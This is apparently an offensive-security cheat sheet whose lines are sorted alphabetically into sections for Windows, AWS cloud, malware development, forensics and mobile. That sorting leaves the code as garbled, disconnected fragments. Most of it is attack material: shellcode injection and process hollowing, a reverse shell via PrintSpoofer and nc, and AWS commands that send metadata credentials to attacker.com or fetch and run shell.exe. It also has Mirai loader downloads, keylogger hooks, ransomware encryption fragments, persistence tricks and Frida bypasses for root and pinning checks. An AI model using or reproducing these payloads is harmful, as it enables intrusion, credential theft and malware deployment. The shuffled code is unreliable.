LPVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
LPVOID pMem = VirtualAlloc(NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
LPVOID pRemote = VirtualAllocEx(pi.hProcess, pImageBase, imageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
MEMORY_BASIC_INFORMATION mbi;
Name="WindowsUpdateConsumer"
Name="WindowsUpdateFilter"
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'P@ss123' -AsPlainText -Force)
NtUnmapViewOfSection(pi.hProcess, pOptionalHeader->ImageBase);
PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pClean;
PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pClean + pDos->e_lfanew);
PROCESS_INFORMATION pi;
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL);
PrintSpoofer.exe -c "cmd.exe" -i
PrintSpoofer.exe -c "nc.exe 10.0.0.1 4444 -e cmd.exe" -i
QueryLanguage="WQL"
Register-ScheduledTask -TaskName "MicrosoftUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force
ResumeThread(pi.hThread);
RtlMoveMemory(pMem, shellcode, scSize);
Rubeus.exe diamond /tgtdeleg \
Rubeus.exe diamond \
SIZE_T attrSize;
SIZE_T scSize = sizeof(shellcode);
STARTUPINFOEXA si = { sizeof(si) };
SetThreadContext(pi.hThread, &ctx); // ctx.Rcx = entry point
SysNtAllocateVirtualMemory endp
SysNtAllocateVirtualMemory proc
SysNtCreateFile endp
SysNtCreateFile proc
Target → Redirector (CDN/VPS) → Team Server (hidden C2)
UpdateProcThreadAttribute(si.lpAttributeList, 0,
VirtualProtect(pTarget, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
VirtualProtect(pTarget, 5, oldProtect, &oldProtect);
WriteProcessMemory(hProcess, mbi.BaseAddress, shellcode, scSize, NULL);
WriteProcessMemory(pi.hProcess, pRemote, pLocalImage, headersSize, NULL);
[DllImport("amsi.dll")]
[System.Runtime.InteropServices.Marshal]::Copy($ptr, $h, 4)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
apropos subject / history / !num # Help/history
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 10.0.0.1
certipy find -u user@corp -p pass -dc-ip 10.0.0.1 -vulnerable
certipy find -u user@domain -p pass -dc-ip dc_ip -vulnerable
certipy req -u user@corp -p pass -ca 'CORP-CA' -template 'ESC1' -upn 'administrator@corp.local'
certipy req -u user@domain -p pass -ca 'CA' -template 'TEMPLATE' -upn 'admin@domain'
chmod -s tcsh/csh/ksh/bash # Disable shell
cmdkey /list # Stored credentials
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
copy payload.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
dig -x ip / host ip # Reverse DNS lookup
dig @ip domain -t AXFR / host -l domain namesvr # Zone transfer
dir C:\Users\*\AppData\Local\Microsoft\Credentials\ /s /b # Credential files
echo "1" > /proc/sys/net/ipv4/ip_forward # Enable forwarding
ettercap -I iface -M arp -Tq -F file.ef MACs/IPs/Ports # MITM with filter
ettercap -T -M arp -F filter // // # MITM entire subnet
ettercap -TP rand_flood # Switch MAC table flood
```

## CLOUD / AWS IAM

```bash
"Action": "*",
"Action": "sts:AssumeRole"
"Action": "sts:AssumeRoleWithWebIdentity",
"Action": ["sts:AssumeRole","sts:TagSession","sts:SetSourceIdentity"],
"Action":"CREATE",
"Changes":[{
"Condition": {"ArnEquals": {"aws:SourceArn": "TRUST_ANCHOR_ARN"}}
"Condition": {"StringEquals": {"oidc.attacker.com:aud": "oidc_client"}}
"Criterion": {
"Effect": "Allow",
"ExtraVariables":["cmd=curl https://attacker.com/collect?data=$(whoami)"],
"InstallDependencies":["True"],
"Name":"secretsmanager.us-east-1.amazonaws.com",
"PlaybookFile":["evil.yml"]
"Principal": {"AWS": "arn:aws:iam::ACCOUNT:user/YOUR_USER"},
"Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
"Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/oidc.attacker.com"},
"Principal": {"Service": "ec2.amazonaws.com"},
"Principal": {"Service": "rolesanywhere.amazonaws.com"},
"Resource": "*"
"ResourceRecordSet":{
"ResourceRecords":[{"Value":"10.0.0.99"}]
"SourceInfo":["{\"owner\":\"attacker\",\"repository\":\"payload\",\"path\":\"playbooks\"}"],
"SourceType":["GitHub"],
"Statement": [
"Statement": [{
"Type":"A",
"Version": "2012-10-17",
"command": ["curl", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "|", "curl", "-X", "POST", "-d", "@-", "https://attacker.com/collect"]
"commands":["Invoke-WebRequest -Uri https://attacker.com/shell.exe -OutFile C:\\temp\\s.exe; C:\\temp\\s.exe"]
"containerOverrides": [{
"iam:Creat*", "iam:Attac*", "iam:Put*", "iam:Pass*", "iam:Delet*",
"iam:Updat*", "iam:List*", "iam:Get*",
"lambda:Creat*", "lambda:Invok*", "lambda:Updat*"
"name": "CONTAINER_NAME",
"source":["https://attacker.com/legit.psm1"],
"sourceInfo":["{\"owner\":\"attacker\",\"repository\":\"payload\",\"path\":\"evil.sh\"}"]
"sourceInfo":["{\"url\":\"https://attacker.com/shell-script-document.json\"}"]
"sourceType":["GitHub"],
"sourceType":["HTTP"],
"sts:As*", "s3:*bject*", "ec2:Run*", "ec2:Describe*",
"type": {"Eq": ["Recon:EC2"]}
--action ARCHIVE \
--activate
--analyzer-name org-scanner \
--assume-role-policy-document '{
--caller-reference ref123 \
--capabilities CAPABILITY_IAM
--certificate client.crt \
--certificate-arn CERT_ARN
--certificate-authority-arn CA_ARN \
--change-batch '{
--client-id oidc_client \
--client-id-list oidc_client
--client-secret SECRET \
--cluster TARGET_CLUSTER \
--command-id "COMMAND_GUID" \
--csr fileb://csr.pem \
--data-sources S3Logs={Enable=false}
--description "Admin"
--destination-id DEST_ID
--detector-id ID \
--display-name "Attacker" \
--document-name "AWS-ApplyAnsiblePlaybooks" \
--document-name "AWS-InstallPowerShellModule" \
--document-name "AWS-RunDocument" \
--document-name "AWS-RunRemoteScript" \
--document-name "AWS-RunSaltState" \
--document-name "AWS-RunShellScript" \
--duration-seconds 3600 \
--emails '[{"Value":"attacker@evil.com","Type":"Work","Primary":true}]'
--endpoint-name TARGET_ENDPOINT \
--endpoint-name privesc-glue \
--event-pattern '{"source":["aws.guardduty"]}' \
--event-pattern '{"source":["aws.nonexistentservice"]}'
--finding-criteria file://criteria.json
--finding-publishing-frequency SIX_HOURS
--function-name TARGET_FUNCTION \
--function-name privesc-lambda \
--group-name AdminGroup
--group-name GROUP_I_AM_IN \
--handler index.handler \
--hosted-zone-config PrivateZone=true \
--hosted-zone-id ZONE_ID \
--iam-instance-profile Name=PRIVILEGED_PROFILE \
--id pwnproject
--identity-store-id STORE_ID \
--ids "GuardDutyTarget"
--image-id ami-0abcdef1234567890 \
--instance-arn INSTANCE_ARN \
--instance-ids "i-00000000000000000" \
--instance-ids "i-XXXX" \
--instance-type t2.micro \
--ip-set-id IPSET_ID \
--launch-type FARGATE \
--layers arn:aws:lambda:REGION:ACCOUNT:layer:MALICIOUS_LAYER:1
--location https://malicious-bucket.s3.amazonaws.com/customiplist.csv \
--managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
--name "PersistenceAnchor" \
--name "PersistenceProfile" \
--name AdminAccess \
--name guardduty-event \
--name pwnproject \
--name secretsmanager.us-east-1.amazonaws.com \
--name stealth-filter \
--network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}" \
--no-password-reset-required
--number-of-nodes 2
--oidc-url https://oidc.attacker.com \
--overrides '{
--parameters '{
--parameters '{"stateurl":["https://attacker.com/payload.sls"]}'
--parameters commands="id; whoami; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME/"
--password 'B@ckd00r2024!' \
--password 'N3wB@ckd00r!' \
--password 'N3wP@ssw0rd!' \
--password 'P@ssw0rd!2024!' \
--permission-set-arn PSET_ARN \
--permissions-boundary arn:aws:iam::ACCOUNT:policy/LOOSE_BOUNDARY
--policy-arn arn:aws:iam::ACCOUNT:policy/EXISTING_POLICY \
--policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \
--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
--policy-document '{
--policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
--policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
--policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*:*","Resource":"*"}]}'
--policy-name "AmazonPersonalizeReadOnly" \
--policy-name privesc \
--principal-id USER_ID
--principal-type USER \
--private-key client.key \
--profile-arn PROFILE_ARN \
--project-id pwnproject \
--project-role Owner
--public-key "ssh-rsa AAAAB3...attacker@kali"
--public-key "ssh-rsa AAAAB3...attacker@kali" \
--role arn:aws:iam::ACCOUNT:role/PRIVILEGED_ROLE \
--role-arn arn:aws:iam::ACCOUNT:role/PRIVILEGED_ROLE \
--role-arn arn:aws:iam::ACCOUNT:role/TARGET_ROLE
--role-arn arn:aws:iam::ACCOUNT:role/rolesanywhere-backdoor
--role-arn arn:aws:iam::MEMBER_ACCOUNT_ID:role/OrganizationAccountAccessRole \
--role-arns arn:aws:iam::ACCOUNT:role/rolesanywhere-backdoor \
--role-name ADMIN_ROLE \
--role-name ASSUMABLE_ROLE \
--role-name EXISTING_ROLE \
--role-name TARGET_ROLE \
--role-name poc-backdoor \
--role-name rolesanywhere-backdoor \
--role-session-name pwned
--rule guardduty-event \
```

## MALWARE / IMPLANT DEVELOPMENT

```bash
!drvobj DriverName # View driver object
".aspx", ".html", ".xml", ".psd"
".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp",
".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
"Select * from Win32_ComputerSystem"))
"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
"Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
"\" /rl HIGHEST /f",
$a = $x.ReadBytes({size});
$hex1 = { 6A 40 68 ?? ?? ?? ?? 6A 14 }
$p = new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0,$ps);
$p.WaitForConnection();
$re1 = /https?:\/\/[a-z0-9.-]+\/gate\.php/
$str1 = "unique_malware_string" wide ascii
$x = new-object System.IO.BinaryReader($p);
&attr, windows.SecurityDelegation, windows.TokenPrimary, &newToken)
&startupInfo, &processInformation);
(*mem)[0] = ddf[i]
(_GetComputerNameA*)GetProcAddress(g_libraryKernel32, ca_GetComputerNameA);
(_GetUserNameA*)GetProcAddress(libraryAdvapi32, ca_GetUserNameA);
);
- cdecl: caller cleans stack, used for printf-like functions
- fastcall: first 2 args in ECX/EDX, rest on stack
- stdcall: callee cleans stack (ret N), used by Win32 API
-> SC_WAITING_ENABLE_RESP -> SC_WAITING_SYSTEM_RESP
-> SC_WAITING_PASSWORD -> SC_WAITING_PASSWD_RESP
-> SC_WAITING_SHELL_RESP -> SC_WAITING_SH_RESP
-> SC_WAITING_TOKEN_RESP
.Substring(0, localState.Substring(subStr).IndexOf('"'));
.sympath SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols
/bin/busybox MIRAI # Query architecture
/bin/busybox tftp -r mirai.ARCH -g LOADER_IP
/bin/busybox wget http://LOADER_IP/bins/mirai.ARCH -O /tmp/mirai
/tmp/mirai
0x8000004, IntPtr.Zero, null, ref si, ref pi))
AES.BlockSize = 128;
AES.IV = key.GetBytes(AES.BlockSize / 8); // FLAW: same IV derivation
AES.Key = key.GetBytes(AES.KeySize / 8);
AES.KeySize = 256;
AES.Mode = CipherMode.CBC;
Application.Exit(); // Terminate
ApplySettings(); // hides file/directory, adds to startup
Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
BitConverter.GetBytes(newImageBase), 4, ref bytesRead);
Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);
Buffer.BlockCopy(temp, 0, data, 0, data.Length);
CREATE_NEW_CONSOLE, NULL, NULL,
Calling conventions:
CheckRemoteDebuggerPresent() # Cross-process debugger check
CloseHandle(hProcess);
CloseHandle(hToken);
Convert.FromBase64String(encKeyStr).Skip(5).ToArray(),
CreateNoWindow = true
CreateNoWindow = true,
CreateProcessWithLogonW(L"pwned", L"by", L"sickboy",
CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE,
CurrentToken = token
DACL_SECURITY_INFORMATION, SE_FILE_OBJECT,
DWORD ProxyDllSize)
DWORD WINAPI HookJob(LPVOID lpParam) {
DWORD cbNeeded;
DWORD numProcesses = cbNeeded / sizeof(DWORD);
DWORD processId = processList[i];
DWORD processList[1024];
DataProtectionScope.CurrentUser));
DecryptAesGcm(cipherTextBytes, _key, 3));
DetectDebugger() || // CheckRemoteDebuggerPresent
DetectSandboxie() || // SbieDll.dll module check
Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
DispatchMessage(&Msg);
EncryptFile(files[i], password);
EnumProcesses(processList, sizeof(processList), &cbNeeded);
Environment.FailFast(null); // Instant process termination
ExitProcess(-1);
File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
File.Move(file, file + ".locked"); // Append .locked extension
File.WriteAllBytes(file, bytesEncrypted);
FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
FileName = Settings.INSTALLPATH
Filter="__EventFilter.Name='Filter'", Consumer="CommandLineEventConsumer.Name='Consumer'"
GetLocalTime(&t);
GetModuleBaseNameA(processHandle, hModule, processName, sizeof(processName));
GetModuleHandle(NULL), // handle to DLL containing hook procedure
GetModuleHandle(NULL), NULL);
GetProcAddress(LoadLibraryA(ref name), ref method), typeof(TDelegate));
GetThreadContext(pi.ThreadHandle, context);
HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
HANDLE hThread = CreateThread(NULL, 0, HookJob, NULL, 0, NULL);
HANDLE hToken;
HANDLE hTokenDuplicate;
HANDLE processHandle = OpenProcess(
HANDLE stealToken(DWORD pid) {
HHOOK KeyboardHook;
HMODULE libraryAdvapi32 = LoadLibraryA(ca_advapi32);
HWND currentWindow = GetForegroundWindow();
HWND hWindow = GetConsoleWindow();
HWND lastWindow = NULL;
HookProcedure, // pointer to the hook procedure
ImpersonateLoggedOnUser(hToken);
IsDebuggerPresent() # PEB.BeingDebugged
IsSmallDisk() || // Disk < 60GB
IsXP()) // Windows XP
KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
KeyboardHook = SetWindowsHookEx(
KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure,
L"C:\\Windows\\System32\\cmd.exe", NULL,
LOCAL_ADDR = util_local_addr();
LOGON_NETCREDENTIALS_ONLY,
LPCWSTR lpParameters,
LPCWSTR lpSubDirectory,
LPCWSTR lpTargetApp, // Target auto-elevated system32 application
LPCWSTR lpTargetDll, // Missing DLL that target loads
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
LoadApi<CreateProcessADelegate>("kernel32.dll", "CreateProcessA");
LoadApi<ZwUnmapViewOfSectionDelegate>("ntdll.dll", "ZwUnmapViewOfSection");
MSG Msg;
NTSTATUS ucmGenericAutoelevationEx(
NTSTATUS ucmSXSMethod(...)
NULL // all desktop threads
Name="Consumer", ExecutablePath="C:\path\to\payload.exe", CommandLineTemplate="C:\path\to\payload.exe"
Name="Filter", EventNameSpace="root\cimv2",
NtGlobalFlag check (PEB+0x68) # Heap flags set by debugger
NtQueryInformationProcess(ProcessDebugPort) # Debug port check
Opacity = 0;
Opacity = 100;
PROCESS_INFORMATION processInformation;
PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
PVOID ProxyDll, // Attacker's proxy DLL
Password = pass, Application = ApplicationName
Process p = Process.Start(startInfo);
Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
Process.Start(new ProcessStartInfo
ProcessInformation pi = new ProcessInformation();
ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
Process[] foundProcesses =
ProtectedData.Unprotect(cipherTextBytes, null,
QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref bytesRead);
Registers: EAX (accumulator), EBX (base), ECX (counter), EDX (data), ESI/EDI (source/dest), EBP (base ptr), ESP (stack ptr)
RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
ResumeThread(pi.ThreadHandle);
SC_CONNECTING -> SC_HANDLE_IACS -> SC_WAITING_USERNAME
SHORT capsShort = GetKeyState(VK_CAPITAL);
SQLiteHandler sqlDatabase = new SQLiteHandler(filePath);
STARTUPINFO startupInfo;
SUPRUNPROCESS_TIMEOUT_DEFAULT);
SYSTEMTIME t;
SePrivEnable("SeDebugPrivilege")
SecureZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
SecureZeroMemory(&startupInfo, sizeof(STARTUPINFO));
```

## FORENSICS / DEFENSE / INCIDENT RESPONSE

```bash
!arp # Exclude ARP
!arp # Exclude ARP noise
"Condition": {"StringLike": {"aws:PrincipalArn": ["arn:aws:iam::*:root"]}}}
"Condition": {"StringNotEquals": {"aws:RequestedRegion": ["ap-south-1"]}}
"Effect": "Deny",
"NotAction": ["iam:*", "organizations:*", "route53:*", "budgets:*",
"Resource": "*",
"Resource": "*", "Effect": "Deny"}
"Sid": "RegionRestrict",
"aws-portal:ModifyPaymentMethods"], "Resource": "*", "Effect": "Deny"}
"cloudwatch:DisableAlarmActions", "cloudwatch:PutDashboard",
"cloudwatch:PutMetricAlarm", "cloudwatch:SetAlarmState"],
"config:DeleteDeliveryChannel", "config:StopConfigurationRecorder"],
"ec2:AcceptVpcPeeringConnection", "globalaccelerator:Create*",
"ec2:AttachEgressOnlyInternetGateway", "ec2:CreateVpcPeeringConnection",
"globalaccelerator:Update*"], "Resource": "*", "Effect": "Deny"}
"guardduty:DeleteIPSet", "guardduty:DeleteMembers",
"guardduty:DeleteThreatIntelSet", "guardduty:DisassociateFromMasterAccount",
"guardduty:DisassociateMembers", "guardduty:StopMonitoringMembers"],
"iam:DeleteRolePolicy", "iam:DetachRolePolicy", "iam:PutRolePermissionsBoundary",
"iam:PutRolePolicy", "iam:UpdateAssumeRolePolicy", "iam:UpdateRole",
"iam:UpdateRoleDescription"], "Resource": ["arn:aws:iam::*:role/CHANGEME"], "Effect": "Deny"}
"ram:DeleteResourceShare", "ram:EnableSharingWithAwsOrganization"],
"support:*", "health:*", "route53domains:*"],
"waf:*", "cloudfront:*", "globalaccelerator:*", "importexport:*",
$a = {6A 40 68 00 30 00 00 6A 14 8D 91}
$a or $b or $c and filesize < 100KB
$b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9}
$c = "UVODFRYSIHLNWPEJXQZAKCBGMT"
(http || dns) && !arp
(http || dns) && !arp # Web + DNS, exclude ARP
(http.request.method == "GET") && (http.request.uri contains "login")
@classmethod
DNSCmd <server> /config /logLevel 0x8100F331
DumpIt.exe
Get-ApplockerFileInformation -Directory C:\Windows\System32\ -Recurse -FileType Exe, Script
Get-EventLog -LogName Security -Newest 10
Get-FileHash <file> | Format-List # PowerShell
IP=`nc -v -l -p 2222 2>&1 > /dev/null | grep from | cut -d[ -f 3 | cut -d] -f 1`
SO Server ← autossh ← SO Sensor 1 (eth0 monitor)
Set-AppLockerPolicy -XMLPolicy C:\Policy.xml
Test-AppLockerPolicy -XMLPolicy C:\Policy.xml -Path C:\Windows\System32\calc.exe -User Everyone
address 192.168.2.128
adfind -csv -b dc=<DOMAIN>,dc=<EXT> -f "(&(objectCategory=Person)(objectClass=User))"
apt-get update && apt-get upgrade
arp.duplicate-address-frame # Duplicate IP detection
arp.src.proto_ipv4 != arp.src.hw_mac # IP-MAC mismatch
auditpol /get /category:*
auditpol /set /category:* /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
ausearch -m USER_LOGIN --success no
author = "Mandiant"
autorunsc -accepteula -m # Hide Microsoft-signed
awk -F: '($3 == "0") {print}' /etc/passwd # UID 0
bulk_extractor -o /output/ image.dd
cat /etc/sudoers
cat /root/.bash_history
cat /var/log/auth.log | grep "Failed password"
certutil -hashfile <file> MD5
certutil -hashfile <file> SHA1
chkrootkit; rkhunter --check # Rootkit scan
class MyPlugin(interfaces.plugins.PluginInterface):
condition:
date = "2016-03-15"
dc3dd if=/dev/sda of=/mnt/image.img hash=md5 log=/mnt/image.log
dc3dd.exe if=\\.\c: of=D:\image.dd hash=md5 log=D:\image.log
dd if=/dev/sda of=/mnt/evidence/image.dd bs=64K conv=noerror,sync
dd if=/dev/sda | ssh user@remote "dd of=/backup/image.dd"
def _generator(self):
def get_requirements(cls):
def run(self):
description = "Silent Banker Trojan"
dig @ip domain -t AXFR # Zone transfer attempt
dig @ns.google.com www.google.com # Query specific nameserver
dig @ns.modwest.com 204.11.246.86 PTR # Reverse DNS
dig lmgsecurity.com NS # Nameserver delegation
dig www.google.com # A record
dir /a "C:\Users"
dns-nameservers 172.16.2.1
dns.qry.name == "example.com" # DNS query
dns.qry.name contains "evil"
dns.qry.type == 1 / 28 # A / AAAA
dnstop -l 3 capture.pcap > dns_report.txt
dnstop -l 3 eth0
dsadd OU <QUARANTINE BAD OU>
dsmove "CN=<USER>,OU=<OLD>,DC=<DOMAIN>,DC=<EXT>" -newparent OU=<NEW>,DC=<DOMAIN>,DC=<EXT>
dsquery ou DC=<DOMAIN>,DC=<EXT>
dsquery user domainroot -inactive 3
eapol # EAPOL (WPA handshake)
echo "dGVzdAB0ZXN0ADEyMzQ=" | base64 -d # "test\0test\01234"
eth.dst == ff:ff:ff:ff:ff:ff # Broadcast
fciv.exe <file> # File Checksum Integrity Verifier
find / -perm -4000 -o -perm -2000
find /<PATH> -type f -exec md5sum {} >> md5sums.txt \;
findsmtpinfo.py capture.pcap # Auto-extract: auth, attachments, MD5 hashes
fls -r -m / /dev/sda1 > bodyfile
for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply"
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "UP"; done
for proc in self.list_processes():
foremost -t all -i image.dd -o /output/
from volatility.framework import constants, contexts, interfaces, renderers
from volatility.framework.automagic import magic
ftkimager \\.\PHYSICALDRIVE0 memory.dmp
gateway 192.168.2.1
gpupdate /force
hash = "4e2324de372c3bfaaef60e5ebf9ea464"
host -l domain namesvr # Zone transfer via host
http.content_type contains "json" # API traffic
http.request.method == "GET"
http.request.method == "GET" # HTTP method
http.request.method == "POST" # Form submissions
http.response.code == 200 # Status code
http.response.code == 302 # Redirects
http.response.code >= 400 # All errors
iface eth0 inet static
import-module Applocker
insmod lime.ko "path=/tmp/mem.lime format=raw"
ip.addr == 192.168.1.1
ip.addr == 192.168.1.1 # Either
ip.dst == 10.0.0.2 # Destination IP
ip.src == 10.0.0.0/24 && tcp.port == 3389 # RDP from subnet
ip.src == 10.0.0.1 # Source IP
iptables -A INPUT -p tcp -s ${IP} -j DROP
iptables -A INPUT -s 10.10.10.0/24 -j DROP
iptables -A INPUT -s 10.10.10.10 -j DROP
iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7
iptables-save > firewall.out; iptables-restore < firewall.out
journalctl -xe
kill -9 <PID>
labrea -z -s -o -b -v -i eth0 2>&1 | tee -a log.txt
ls -la /etc/cron*
lynis audit system # Audit
mactime -b bodyfile -d > timeline.csv
maldet -a /home/ # Malware scan
modprobe fmem; dd if=/dev/fmem of=/tmp/mem.dd
nbtscan <IP RANGE>
nbtstat -A <IP>
nc -l -p [port] # Listener
nc -l -p [port] -e /bin/bash # Backdoor shell (honeypot)
nc -v -n -z -w1 [IP] [start]-[end] # Port scanner
nessus -q -x -T html <server> <port> <user> <pass> <targets.txt> <results.html>
net localgroup administrators
net view /all
net.ipv4.tcp_max_syn_backlog = 4096
net.ipv4.tcp_syn_retries = 2
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_syncookies = 1
netdom query WORKSTATION / SERVER / DC / PDC / TRUST / FSMO
netmask 255.255.255.0
```

## MOBILE (ANDROID/IOS)

```bash
'$s16FridaInTheMiddle11ContentViewV13dummyFunction4flagySS_tF');
( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 myapp_backup.ab ) | tar xfvz -
(lldb) breakpoint set --name 'FridaInTheMiddle.systemSanityCheck'
(lldb) c
(lldb) finish
(lldb) finish # Let constructors return
(lldb) image lookup -rn 'frida'
(lldb) process connect connect://localhost:1234
(lldb) register write x0 0 # Force Swift bool return to false
- CFI/SCS → target data structures, not control flow
- KASLR → info leak (often from /proc or sysfs)
- PXN/PAN → kernel RW only, no execute
--es redirect_intent "intent:#Intent;component=com.target/.SensitiveActivity;end"
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
-e unity "-xrsdk-pre-init-library /data/app/.../lib/arm64/libpayload.so"
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-o out/ -i in/ -f harness.js
-o out/ -i in/ -f harness.js --standalone-mutator cmd --mutator-command "radamsa"
.forEach(function(s, i) { console.log(" " + i + ": " + s); });
.implementation = function(){ return this; };
.implementation = function(km, tm, sr) {
.implementation = function(messenger, name) {
.map(DebugSymbol.fromAddress).slice(0, 10)
1. Find kernel vulnerability (fuzzing IOCTLs, reviewing patch diffs)
2. Determine exploit primitive (arbitrary read, arbitrary write, UAF)
3. Bypass mitigations:
4. Overwrite cred structure → set uid=0, gid=0, selinux context
5. Disable SELinux enforcement for full root
<!-- Attacker manifest -->
</activity>
</dict>
</intent-filter>
<action android:name="com.victim.app.ACTION_CALLBACK"/>
<activity android:name=".StealActivity" android:exported="true">
<category android:name="android.intent.category.DEFAULT"/>
<intent-filter>
<key>NSAllowsArbitraryLoads</key><true/> <!-- ALL TLS bypassed -->
<key>NSAllowsArbitraryLoadsInWebContent</key><true/> <!-- WebView exempt -->
<key>NSAllowsLocalNetworking</key><true/>
<key>NSAppTransportSecurity</key>
<key>NSExceptionDomains</key>
<key>NSIncludesSubdomains</key><true/>
<key>NSTemporaryExceptionAllowsInsecureHTTPLoads</key><true/>
<key>example.com</key>
AM.getRunningAppProcesses.implementation = function() {
App Sandbox → XNU Kernel (PAC, KASLR, KTRR/KPP) → Secure Enclave (SEP) → Boot Chain
Build.FINGERPRINT.value = 'google/panther/panther:14/UP1A.231105.003:user/release-keys';
Build.MANUFACTURER.value = 'Google';
Build.MODEL.value = 'Pixel 7 Pro';
Checks.isDeviceRooted.implementation = function() { return false; };
Checks.isEmulator.implementation = function() { return false; };
Checks.isFridaDetected.implementation = function() { return false; };
CronetB.enablePublicKeyPinningBypassForLocalTrustAnchors.overload('boolean')
Debug.isDebuggerConnected.implementation = function() { return false; };
EncUtil.encrypt.implementation = function(key, value) {
Interceptor.attach(addr, {
Interceptor.attach(fileExistsAtPath, {
Interceptor.attach(fn, {
Interceptor.attach(hook.implementation, {
Interceptor.replace(addr, new NativeCallback(function(a, b, c) {
Interceptor.replace(ptrace, new NativeCallback(function() {
Java.choose("com.example.MyActivity", {
Java.enumerateClassLoaders({
Java.perform(function() {
MC.$init.overload('io.flutter.plugin.common.BinaryMessenger', 'java.lang.String')
Memory.protect(ptr(address), size, 'rwx');
Memory.scan(flutter.base, flutter.size, sig, {
Memory.scan(range.base, range.size, search, {
Object.keys(details.context).slice(0, 8).forEach(function(r) {
Patch the final boolean comparison before finish()/System.exit(), not the entire routine.
PinUtil.checkPin.implementation = function(pin) {
Pinner.check.overload('java.lang.String', 'java.util.List').implementation = function(){};
Process.enumerateModules().forEach(function(m) {
Process.enumerateRanges('r--').forEach(function(range) {
Process.setExceptionHandler(function(details) {
SELECT * FROM users;
SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;','[Ljavax.net.ssl.TrustManager;','java.security.SecureRandom')
Search in JADX: GET_SIGNATURES, GET_SIGNING_CERTIFICATES, apkContentsSigners
Search in JADX: MessageDigest, SHA-256, Base64
Search in JADX: getInstallerPackageName, com.android.vending
TextView.setText.overload("java.lang.CharSequence").implementation = function(x) {
Thread.backtrace(details.context, Backtracer.ACCURATE)
X509TrustManager.checkClientTrusted.implementation = function(){ };
X509TrustManager.checkServerTrusted.implementation = function(){ };
adb -s <DEVICE> shell # Target specific device
adb backup -apk com.app -f backup.ab # Full app backup
adb connect <IP>:5555 # Connect over network
adb devices # List connected devices
adb forward tcp:8080 tcp:8080 # Forward local:remote
adb install -d test.apk # Allow version downgrade
adb install -r test.apk # Replace existing app
adb install -t test.apk # Allow test packages
adb install drozer-agent.apk # Install agent on device
adb install test.apk # Install APK
adb logcat *:E # Error level only
adb logcat -b radio # Radio/telephony buffer
adb logcat | grep <PID> # Filter by PID
